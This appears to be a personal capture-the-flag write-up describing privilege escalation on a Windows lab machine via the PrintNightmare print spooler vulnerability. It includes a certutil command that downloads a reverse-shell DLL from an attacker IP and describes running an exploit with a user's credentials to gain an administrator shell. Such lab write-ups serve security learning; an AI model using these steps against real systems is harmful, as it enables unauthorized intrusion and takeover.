# Privilege Escalation to Administrator
## Discovered spooler service is running
Discovered spooler service is running via command `Get-Service -Name "spooler"`
![[Pasted image 20211007185804.png]]
## If spooler service is running with RPC port 135, SMB on port 445 with signing disalbed[[Driver/10 - Common Enumeration]], [it is most likely vulnerable to PrintNightmare - Windows Print Spooler RCE/LPE Vulnerability (CVE-2021-34527, CVE-2021-1675)](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
If spooler service is running with RPC port 135, SMB on port 445 with signing disalbed[[Driver/10 - Common Enumeration]], [it is most likely vulnerable to PrintNightmare - Windows Print Spooler RCE/LPE Vulnerability (CVE-2021-34527, CVE-2021-1675)](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527).
## Using [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)) to get escalate privileges to administrator
### First we will upload reverse shell DLL to victim machine
First we will upload reverse shell DLL to victim machine using command `certutil -urlcache -split -f "http://10.10.14.98:8000/rs.dll" dn.dll`.
![[Pasted image 20211007190628.png]]
## Running exploit python script providing path of DLL and 'tony' username and password to get reverse shell as administrator
Running exploit python script providing path of DLL and 'tony' username and password to get reverse shell as administrator.
![[Pasted image 20211007191515.png]]

